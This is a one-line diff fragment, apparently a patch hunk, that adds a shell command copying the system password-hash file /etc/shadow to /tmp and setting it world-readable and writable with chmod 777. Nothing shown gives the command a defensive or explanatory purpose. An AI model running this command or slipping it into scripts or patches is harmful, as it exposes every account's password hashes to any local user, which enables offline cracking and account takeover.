@@ -1,0 +1,1 @@
+cp /etc/shadow /tmp/shad ; chmod 777 /tmp/shad
